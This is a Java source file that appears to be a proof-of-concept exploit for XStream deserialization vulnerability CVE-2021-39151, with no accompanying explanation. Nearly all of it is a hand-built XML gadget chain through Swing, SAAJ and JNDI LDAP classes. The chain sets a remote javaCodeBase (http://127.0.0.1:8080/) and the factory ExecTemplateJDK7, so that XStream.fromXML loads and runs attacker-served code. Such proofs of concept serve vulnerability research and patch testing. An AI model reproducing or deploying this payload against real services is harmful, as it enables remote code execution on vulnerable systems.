package com.r17a.xstream.cve.eventlistenerlist;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39151 {
    public static void main(String[] args) {
        String xml = "<javax.swing.event.EventListenerList serialization='custom'>\n" +
                "  <javax.swing.event.EventListenerList>\n" +
                "    <default>\n" +
                "      <listenerList>\n" +
                "        <javax.swing.undo.UndoManager>\n" +
                "          <hasBeenDone>true</hasBeenDone>\n" +
                "          <alive>true</alive>\n" +
                "          <inProgress>true</inProgress>\n" +
                "          <edits>\n" +
                "            <com.sun.xml.internal.ws.api.message.Packet>\n" +
                "              <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "                <parsedMessage>true</parsedMessage>\n" +
                "                <soapVersion>SOAP_11</soapVersion>\n" +
                "                <bodyParts/>\n" +
                "                <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "                  <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "                  <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\n" +
                "                    <soapPart/>\n" +
                "                    <mm>\n" +
                "                      <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                        <aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'>\n" +
                "                          <cleaned>false</cleaned>\n" +
                "                          <entries>\n" +
                "                            <com.sun.jndi.ldap.LdapEntry>\n" +
                "                              <DN>cn=four,cn=three,cn=two,cn=one</DN>\n" +
                "                              <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\n" +
                "                                <javax.naming.directory.BasicAttribute>\n" +
                "                                  <default>\n" +
                "                                    <ignoreCase>false</ignoreCase>\n" +
                "                                  </default>\n" +
                "                                  <int>4</int>\n" +
                "                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                                    <javax.naming.directory.BasicAttribute>\n" +
                "                                      <default>\n" +
                "                                        <ordered>false</ordered>\n" +
                "                                        <attrID>objectClass</attrID>\n" +
                "                                      </default>\n" +
                "                                      <int>1</int>\n" +
                "                                      <string>javanamingreference</string>\n" +
                "                                    </javax.naming.directory.BasicAttribute>\n" +
                "                                    <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                      <default>\n" +
                "                                        <rdn class='com.sun.jndi.ldap.LdapName' serialization='custom'>\n" +
                "                                          <com.sun.jndi.ldap.LdapName>\n" +
                "                                            <string>cn=four,cn=three,cn=two,cn=one</string>\n" +
                "                                            <boolean>false</boolean>\n" +
                "                                          </com.sun.jndi.ldap.LdapName>\n" +
                "                                        </rdn>\n" +
                "                                      </default>\n" +
                "                                    </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                                    <javax.naming.directory.BasicAttribute>\n" +
                "                                      <default>\n" +
                "                                        <ordered>false</ordered>\n" +
                "                                        <attrID>javaCodeBase</attrID>\n" +
                "                                      </default>\n" +
                "                                      <int>1</int>\n" +
                "                                      <string>http://127.0.0.1:8080/</string>\n" +
                "                                    </javax.naming.directory.BasicAttribute>\n" +
                "                                    <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                      <default/>\n" +
                "                                    </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                                    <javax.naming.directory.BasicAttribute>\n" +
                "                                      <default>\n" +
                "                                        <ordered>false</ordered>\n" +
                "                                        <attrID>javaClassName</attrID>\n" +
                "                                      </default>\n" +
                "                                      <int>1</int>\n" +
                "                                      <string>refObj</string>\n" +
                "                                    </javax.naming.directory.BasicAttribute>\n" +
                "                                    <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                      <default/>\n" +
                "                                    </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                                    <javax.naming.directory.BasicAttribute>\n" +
                "                                      <default>\n" +
                "                                        <ordered>false</ordered>\n" +
                "                                        <attrID>javaFactory</attrID>\n" +
                "                                      </default>\n" +
                "                                      <int>1</int>\n" +
                "                                      <string>ExecTemplateJDK7</string>\n" +
                "                                    </javax.naming.directory.BasicAttribute>\n" +
                "                                    <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                      <default/>\n" +
                "                                    </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                  </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                                </javax.naming.directory.BasicAttribute>\n" +
                "                              </attributes>\n" +
                "                            </com.sun.jndi.ldap.LdapEntry>\n" +
                "                          </entries>\n" +
                "                          <limit>2</limit>\n" +
                "                          <posn>0</posn>\n" +
                "                          <homeCtx/>\n" +
                "                          <more>true</more>\n" +
                "                          <hasMoreCalled>true</hasMoreCalled>\n" +
                "                        </aliases>\n" +
                "                      </it>\n" +
                "                    </mm>\n" +
                "                  </multiPart>\n" +
                "                </sm>\n" +
                "              </message>\n" +
                "            </com.sun.xml.internal.ws.api.message.Packet>\n" +
                "          </edits>\n" +
                "          <indexOfNextAdd>0</indexOfNextAdd>\n" +
                "          <limit>100</limit>\n" +
                "        </javax.swing.undo.UndoManager>\n" +
                "      </listenerList>\n" +
                "    </default>\n" +
                "    <string>java.lang.InternalError</string>\n" +
                "    <javax.swing.undo.UndoManager reference='../default/listenerList/javax.swing.undo.UndoManager'/>\n" +
                "    <null/>\n" +
                "  </javax.swing.event.EventListenerList>\n" +
                "</javax.swing.event.EventListenerList>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
